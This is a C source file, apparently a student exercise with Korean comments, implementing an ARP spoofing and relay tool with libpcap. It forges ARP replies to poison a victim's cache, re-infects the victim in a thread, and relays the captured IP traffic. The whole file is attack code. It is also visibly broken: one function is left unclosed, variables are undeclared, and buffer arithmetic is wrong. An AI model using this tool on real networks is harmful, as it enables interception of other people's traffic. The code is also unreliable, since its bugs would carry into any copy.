#include <unistd.h>
#include <stdio.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <string.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdint.h>
#include <pthread.h>


void printMAC(uint8_t* mac){
		for(int i=0;i<5;i++)printf("%02x:",mac[i]);
			printf("%02x\n",mac[5]);
}

#pragma pack(push,1)
typedef struct arp_hdr {
	uint16_t hd_type;
	uint16_t p_type;
	uint8_t hd_len;
	uint8_t p_len;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
}arp_hdr;

typedef struct arp_packet {
	struct ether_header ETH_hdr;
	arp_hdr ARP_hdr;
}arp_packet;

//thread에 사용할 구조체

typedef struct info{
	pcap_t* fp;
	struct arp_packet* packet;
        char* interface;
}info;	
#pragma pack(pop)

void* FILL_ETH(struct ether_header *ethh, uint8_t *dst_mac, uint8_t *src_mac){
		memcpy(ethh->ether_dhost,dst_mac,6);
		memcpy(ethh->ether_shost,src_mac,6);
		ethh->ether_type=ntohs(ETHERTYPE_ARP);
}

void* FILL_ARP(arp_hdr * arp_header , uint8_t *sender_mac, uint8_t *target_mac, struct in_addr *sender_ip, struct in_addr *target_ip, int opcode){
	
	memcpy(arp_header->sender_mac, sender_mac, 6*sizeof(uint8_t));
	if (target_mac != NULL)
		memcpy(arp_header->target_mac, target_mac, 6*sizeof(uint8_t));
	else
		memset(arp_header->target_mac, 0x00, 6*sizeof(uint8_t));
	
	memcpy(arp_header->sender_ip, sender_ip, sizeof(struct in_addr)); 
	memcpy(arp_header->target_ip, target_ip, sizeof(struct in_addr));
	
	arp_header->hd_type = htons(ARPHRD_ETHER);	 //hw-type	        : ethernet
	arp_header->p_type = htons(ETHERTYPE_IP);	 //protocol-type	: 2048 for ip
	arp_header->hd_len = ETHER_ADDR_LEN;		 //hw-addr-length       : 6-byte
	arp_header->p_len = sizeof(in_addr_t);		 //protocol-addr-length : 4-byte
	arp_header->opcode = (opcode !=0) ? htons(ARPOP_REQUEST) : htons(ARPOP_REPLY);  //ARP request 
}

void sum(struct arp_packet* packet, struct ether_header *ethh,arp_hdr *arp){
	memset(packet,0x00,sizeof(struct arp_packet));
	memcpy(packet,ethh,sizeof(struct ether_header));
	memcpy(packet+sizeof(struct ether_header),arp,sizeof(arp_hdr));
}

void get_mac_address(uint8_t* wanted_mac, struct arp_packet* arp_pkt, struct in_addr * ip, char* interface){
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];	
	struct pcap_pkthdr *header;
	memset(&header,NULL,sizeof(struct pcap_pkthdr));	
	const unsigned char* packet;
	int res;
	handle=pcap_open_live(interface,BUFSIZ,1,1000,errbuf);
	if(handle==NULL){
		fprintf(stderr,"couldn't open device %s:%s\n",interface,errbuf);
		exit(1);
	}
	
	if(pcap_sendpacket(handle,(unsigned char*)arp_pkt,sizeof(struct arp_packet))==-1){
		pcap_perror(handle,0);
		pcap_close(handle);
		exit(1);
	}
	while(1){
		res=pcap_next_ex(handle,&header,&packet);
		if(res==0) continue;
		if(res==-1||res==-2)break;
		struct ether_header *eth_hdr;
		eth_hdr=(struct ether_header *)packet;
		if(ntohs(eth_hdr->ether_type)==ETHERTYPE_ARP){
			struct ether_arp *arph;
			arph=(arp_hdr *)(packet+sizeof(struct ether_header));						      //char ipbuf[20]="";
			//char packet_ipbuf[20]="";
			//inet_ntop(AF_INET,ip,ipbuf,20);
		       	//sprintf(packet_ipbuf,"%d.%d.%d.%d",arph->arp_spa[0],arph->arp_spa[1],arph->arp_spa[2],arph->arp_spa[3]);
							
			if(!memcmp(arph->arp_spa,ip,4)){	
				memcpy(wanted_mac,&packet[6],6);
				break;
			}
			else
				continue;
		}
	
	}
	pcap_close(handle);
	
}

void* period_infection(void *argu){
	printf("infect sender periodly\n");


void* infection_func(void * argu){
	//fake arp reply start
	printf("if arp -->infect sender again\n");
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	const unsigned char *packet;
	struct pcap_pkthdr *header;
	memset(&header,NULL,sizeof(struct pcap_pkthdr));
	int res;
	info* arg=(info *)argu;
	char * dev= arg->interface;
	handle=arg->fp;
	while(1){
		res=pcap_next_ex(handle, &header, &packet);
		struct ether_header *eth_hdr;
		eth_hdr=(struct ether_header *)packet;
		if(ntohs(eth_hdr->ether_type)==ETHERTYPE_ARP){
			if(pcap_sendpacket(handle, arg->packet, sizeof(arp_packet)) == -1){
				pcap_perror(handle,0);
				pcap_close(handle);
				exit(1);
			}
		}
	}
}

void* relay_func(void * argu){
	//relay packet
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	const unsigned char *packet;
	struct pcap_pkthdr *header;
	int res;
	info *arg=(info *)argu;
	char *dev = arg->interface;
	handle = arg->fp;

	while(1){
		res=pcap_next_ex(handle, &header, &packet);
		struct ether_header *eth_hdr;
		eth_hdr=(struct ether_header *)packet;
		if(ntohs(eth_hdr->ether_type)== ETHERTYPE_IP)
		{
				if(!memcmp(eth_hdr->ether_shost,arg->packet->ETH_hdr.ether_shost,6)){
					memcpy(eth_hdr->ether_shost,arg->packet->ETH_hdr.ether_shost,6);
					if(pcap_sendpacket(handle,packet,header->caplen)==-1){
						pcap_perror(handle,0);
						pcap_close(handle);
						exit(1);
					}
					printf("packet through me\n");
				}
		}
	}
}
					


					 
		


int main(int argc, char *argv[]){
	
	if(argc != 4){
		printf("argv error \n");
		return -1;
	}

	uint8_t *my_mac=(uint8_t *)malloc(sizeof(uint8_t)*6);
	uint8_t *sender_mac=(uint8_t *)malloc(sizeof(uint8_t)*6);
	uint8_t *target_mac=(uint8_t *)malloc(sizeof(uint8_t)*6);
	
	struct in_addr *my_ip=(struct in_addr *)malloc(sizeof(struct in_addr));
	struct in_addr *sender_ip=(struct in_addr *)malloc(sizeof(struct in_addr));
	struct in_addr *target_ip=(struct in_addr *)malloc(sizeof(struct in_addr)) ;
        	
	struct ifreq ifr;
	struct sockaddr_in *sin;
	
	arp_hdr arp_header, fake_arp_header;
	struct ether_header ethh,fake_ethh;
	struct arp_packet regular_pkt, fake_pkt;
	
	int time; // 공격 주기
	info argu;  //pthread에 전달해줄 인자
	
	//thread 생성
	pthread_t p_thread[3];
	int thr_id;
	int status;
	
	pcap_t* handle;
	handle=pcap_open_live(argv[1],BUFSIZ,1,1000,errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", argv[1], errbuf);
		exit(0);
	}
	argu.fp= fp;
	memset(&ifr,0x00,sizeof(ifr));
	strcpy(ifr.ifr_name,argv[1]);
	
	int fd=socket(AF_INET, SOCK_DGRAM,0);
	if(fd==-1){ perror("socket"); exit(1);}  
	
	
	//자신의 ip가져오기 
	if(ioctl(fd,SIOCGIFADDR,&ifr)==-1){perror("ioctl");exit(1);}
	sin=(struct sockaddr_in*)&ifr.ifr_addr;
	*my_ip = sin -> sin_addr;
	char ipbuf[20]="";
	inet_ntop(AF_INET,my_ip,ipbuf,20);
	printf("attack ip: %s\n",ipbuf);
	
	//sender_ip, target_ip넣주기
	inet_pton(AF_INET,argv[2],sender_ip);
	inet_pton(AF_INET,argv[3],target_ip);
	
	//자신의 mac주소 가져오기
	if(ioctl(fd,SIOCGIFHWADDR,&ifr)==-1){perror("ioctl");exit(1);}
	my_mac=(uint8_t*)ifr.ifr_hwaddr.sa_data;
	printf("attacker mac : ");
	printMAC(my_mac);
	
	memset(&ethh,0x00,sizeof(struct ether_header));
	memset(&arp_header,0x00,sizeof(arp_hdr));
	
	//상대의 mac주소 가져오기
	memset(sender_mac,NULL,6*sizeof(uint8_t));
	FILL_ARP(&arp_header,my_mac,sender_mac,my_ip,sender_ip,1);
	FILL_ETH(&ethh,"\xff\xff\xff\xff\xff\xff",my_mac);
	memset(&regular_pkt,NULL,sizeof(arp_packet));
	sum(&regular_pkt,&ethh,&arp_header);
	get_mac_address(sender_mac,&regular_pkt,sender_ip,argv[1]);
	printf("sender mac :");
	printMAC(sender_mac);
	memset(&ethh,0x00,sizeof(struct ether_header));
	memset(&arp_header,0x00,sizeof(arp_hdr));
	printf("sendermac 구하기 완료\n");
	//target의 mac주소 가져오기
	memset(target_mac, NULL,6*sizeof(uint8_t));
	FILL_ARP(&arp_header,my_mac,target_mac,my_ip,target_ip,1);
	FILL_ETH(&ethh,"\xff\xff\xff\xff\xff\xff",my_mac);
	sum(&regular_pkt,&ethh,&arp_header);
	get_mac_address(target_mac,&regular_pkt,target_ip,argv[1]);
	printf("target mac : ");
	printMAC(target_mac);	
 	printf("target mac 구하기 완료\n");	
	
	//fake reply packet 작성하기
	memset(&fake_ethh,0x00,sizeof(struct ether_header));
	memset(&fake_arp_header,0x00,sizeof(arp_hdr));	
	
	FILL_ARP(&fake_arp_header,my_mac,sender_mac,target_ip,sender_ip,0);
	FILL_ETH(&fake_ethh,sender_mac,my_mac);
	memset(&fake_pkt,NULL,sizeof(arp_packet));
	sum(&fake_pkt,&fake_ethh,&fake_arp_header);
	
	argu.packet = &fake_pkt;
	argu.interface = argv[1];
	
	thr_id = pthread_create(&p_thread[0], NULL, infection_func, (void *)&argu);
	if (thr_id < 0)
	{
		perror("thread create error : ");
		exit(0);
	}
	pthread_detach(p_thread[0]); 
	
	thr_id = pthread_create(&p_thread[1], NULL, relay_func, (void *)&argu);
	if (thr_id < 0)
	{
		perror("thread create error : ");
		exit(0);
	}
	pthread_detach(p_thread[1]); 
	
	close(fd);
	return 0;
}
